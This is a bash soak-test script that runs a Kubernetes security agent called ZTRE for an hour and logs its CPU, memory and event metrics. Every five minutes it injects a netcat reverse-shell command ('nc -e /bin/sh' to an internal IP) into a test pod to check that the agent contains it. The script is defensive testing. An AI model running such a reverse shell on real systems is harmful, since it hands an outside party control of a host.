#!/usr/bin/env bash
# ==============================================================================
# ZTRE Soak Test: 1-Hour Endurance Run
# Validates M5 stability (CPU/RAM) under continuous legitimate workload
# with periodic attack injection every 5 minutes.
# ==============================================================================
set -euo pipefail

DURATION=${1:-3600}          # Default 1 hour
SAMPLE_INTERVAL=60           # Sample every 60s
ATTACK_INTERVAL=300          # Inject attack every 5 min
OUTPUT_DIR="evidence/soak"
METRICS_CSV="$OUTPUT_DIR/metrics.csv"

COLOR_GREEN="\033[0;32m"
COLOR_BLUE="\033[0;34m"
COLOR_YELLOW="\033[0;33m"
COLOR_RED="\033[0;31m"
COLOR_RESET="\033[0m"
log_info()  { echo -e "${COLOR_BLUE}[INFO]${COLOR_RESET} $(date -Iseconds) $*"; }
log_warn()  { echo -e "${COLOR_YELLOW}[WARN]${COLOR_RESET} $(date -Iseconds) $*"; }
log_pass()  { echo -e "${COLOR_GREEN}[PASS]${COLOR_RESET} $(date -Iseconds) $*"; }
log_fail()  { echo -e "${COLOR_RED}[FAIL]${COLOR_RESET} $(date -Iseconds) $*"; }

mkdir -p "$OUTPUT_DIR"

echo "======================================================================"
echo "    ZTRE Soak Test: ${DURATION}s Endurance Run                        "
echo "======================================================================"

# Discover pods
AGENT_POD=$(kubectl get pods -n ztre-system -l app.kubernetes.io/name=ztre-agent \
  --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
AGENT_IP=$(kubectl get pod -n ztre-system "$AGENT_POD" -o jsonpath='{.status.podIP}')
log_info "ZTRE Agent: $AGENT_POD ($AGENT_IP)"

# Ensure test workloads exist
log_info "Ensuring test workloads are deployed..."
kubectl apply -f deploy/workloads/ >/dev/null 2>&1
kubectl rollout status deployment/frontend -n ztre-test --timeout=60s >/dev/null 2>&1
kubectl rollout status deployment/vulnerable-app -n ztre-test --timeout=60s >/dev/null 2>&1

VULN_POD=$(kubectl get pod -n ztre-test -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')

# Deploy continuous legitimate workload generator
log_info "Starting continuous legitimate workload generator..."
kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true >/dev/null 2>&1
kubectl run legit-soak -n ztre-test --image=alpine --restart=Always -- /bin/sh -c '
while true; do
  ls /tmp >/dev/null 2>&1
  sleep 1
done
'
kubectl wait --for=condition=Ready pod/legit-soak -n ztre-test --timeout=30s >/dev/null 2>&1

# CSV header
echo "timestamp,cpu_millicores,memory_mi,goroutines,events_ingested,events_dropped,containments,api_errors" > "$METRICS_CSV"

START=$(date +%s)
LAST_ATTACK=0
SAMPLE_COUNT=0
ATTACK_COUNT=0

log_info "Beginning soak test (duration=${DURATION}s, sample=${SAMPLE_INTERVAL}s, attack=${ATTACK_INTERVAL}s)..."
echo ""

while true; do
    ELAPSED=$(($(date +%s) - START))
    [ "$ELAPSED" -ge "$DURATION" ] && break

    # Sample agent metrics
    METRICS=$(curl -sf "http://${AGENT_IP}:9090/metrics" 2>/dev/null || echo "")
    
    # Get resource usage from kubectl top
    TOP_LINE=$(kubectl top pod "$AGENT_POD" -n ztre-system --no-headers 2>/dev/null || echo "- 0m 0Mi")
    CPU=$(echo "$TOP_LINE" | awk '{print $2}' | sed 's/m$//')
    MEM=$(echo "$TOP_LINE" | awk '{print $3}' | sed 's/Mi$//')
    
    # Parse Prometheus metrics
    GOROUTINES=$(echo "$METRICS" | grep '^go_goroutines ' | awk '{print $2}' || echo "0")
    INGESTED=$(echo "$METRICS" | grep '^ztre_events_ingested_total' | awk '{sum+=$2} END {printf "%.0f", sum}' || echo "0")
    DROPPED=$(echo "$METRICS" | grep '^ztre_events_dropped_total ' | awk '{print $2}' || echo "0")
    CONTAINMENTS=$(echo "$METRICS" | grep '^ztre_containment_actions_total ' | awk '{print $2}' || echo "0")
    API_ERRORS=$(echo "$METRICS" | grep '^ztre_api_errors_total ' | awk '{print $2}' || echo "0")
    
    TIMESTAMP=$(date -Iseconds)
    echo "${TIMESTAMP},${CPU},${MEM},${GOROUTINES},${INGESTED},${DROPPED},${CONTAINMENTS},${API_ERRORS}" >> "$METRICS_CSV"
    
    SAMPLE_COUNT=$((SAMPLE_COUNT + 1))
    log_info "[${ELAPSED}/${DURATION}s] CPU=${CPU}m MEM=${MEM}Mi goroutines=${GOROUTINES} ingested=${INGESTED} dropped=${DROPPED} containments=${CONTAINMENTS}"

    # Periodic attack injection
    SINCE_ATTACK=$((ELAPSED - LAST_ATTACK))
    if [ "$SINCE_ATTACK" -ge "$ATTACK_INTERVAL" ] && [ "$ELAPSED" -gt 0 ]; then
        ATTACK_COUNT=$((ATTACK_COUNT + 1))
        log_warn "Injecting attack #${ATTACK_COUNT} (reverse shell on vulnerable-app)..."
        
        # Reset vulnerable-app quarantine label first
        kubectl label pod "$VULN_POD" -n ztre-test ztre/quarantine- --overwrite >/dev/null 2>&1 || true
        
        # Trigger reverse shell
        kubectl exec -n ztre-test "$VULN_POD" -- /bin/sh -c 'nc -e /bin/sh 10.91.128.10 4444' >/dev/null 2>&1 || true
        LAST_ATTACK=$ELAPSED
        
        sleep 2
        
        # Verify quarantine
        Q_LABEL=$(kubectl get pod "$VULN_POD" -n ztre-test -o jsonpath='{.metadata.labels.ztre/quarantine}' 2>/dev/null || true)
        if [ "$Q_LABEL" = "true" ]; then
            log_pass "Attack #${ATTACK_COUNT} detected and contained"
        else
            log_fail "Attack #${ATTACK_COUNT} NOT contained!"
        fi
    fi

    sleep "$SAMPLE_INTERVAL"
done

# Cleanup
kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true

# Final analysis
echo ""
echo "======================================================================"
echo "    Soak Test Results                                                  "
echo "======================================================================"

# Parse CSV for analysis
PEAK_CPU=$(tail -n +2 "$METRICS_CSV" | awk -F',' '{print $2}' | sort -n | tail -1)
PEAK_MEM=$(tail -n +2 "$METRICS_CSV" | awk -F',' '{print $3}' | sort -n | tail -1)
AVG_CPU=$(tail -n +2 "$METRICS_CSV" | awk -F',' '{sum+=$2; n++} END {printf "%.1f", sum/n}')
AVG_MEM=$(tail -n +2 "$METRICS_CSV" | awk -F',' '{sum+=$3; n++} END {printf "%.1f", sum/n}')
FIRST_GOROUTINES=$(tail -n +2 "$METRICS_CSV" | head -1 | awk -F',' '{print $4}')
LAST_GOROUTINES=$(tail -n +2 "$METRICS_CSV" | tail -1 | awk -F',' '{print $4}')
TOTAL_DROPPED=$(tail -n +2 "$METRICS_CSV" | tail -1 | awk -F',' '{print $6}')

echo "  Duration:           ${DURATION}s ($(( DURATION / 60 )) min)"
echo "  Samples collected:  ${SAMPLE_COUNT}"
echo "  Attacks injected:   ${ATTACK_COUNT}"
echo ""
echo "  CPU (avg/peak):     ${AVG_CPU}m / ${PEAK_CPU}m    (PRD limit: 20m = 2%)"
echo "  Memory (avg/peak):  ${AVG_MEM}Mi / ${PEAK_MEM}Mi  (PRD limit: 128Mi)"
echo "  Goroutines (start): ${FIRST_GOROUTINES}"
echo "  Goroutines (end):   ${LAST_GOROUTINES}"
echo "  Events dropped:     ${TOTAL_DROPPED}"
echo ""
echo "  CSV output:         ${METRICS_CSV}"
echo ""

# Verdicts
if [ "${PEAK_MEM:-0}" -le 128 ]; then
    echo -e "  ${COLOR_GREEN}[PASS]${COLOR_RESET} Memory within PRD limit (peak ${PEAK_MEM}Mi <= 128Mi)"
else
    echo -e "  ${COLOR_RED}[FAIL]${COLOR_RESET} Memory exceeded PRD limit (peak ${PEAK_MEM}Mi > 128Mi)"
fi

if [ "${TOTAL_DROPPED:-0}" -eq 0 ]; then
    echo -e "  ${COLOR_GREEN}[PASS]${COLOR_RESET} Zero event drops during soak"
else
    echo -e "  ${COLOR_YELLOW}[WARN]${COLOR_RESET} ${TOTAL_DROPPED} events dropped during soak"
fi

GOROUTINE_DELTA=$(( ${LAST_GOROUTINES:-0} - ${FIRST_GOROUTINES:-0} ))
if [ "$GOROUTINE_DELTA" -le 5 ]; then
    echo -e "  ${COLOR_GREEN}[PASS]${COLOR_RESET} No goroutine leak detected (delta: ${GOROUTINE_DELTA})"
else
    echo -e "  ${COLOR_RED}[FAIL]${COLOR_RESET} Possible goroutine leak (delta: ${GOROUTINE_DELTA})"
fi

echo ""
echo "======================================================================"
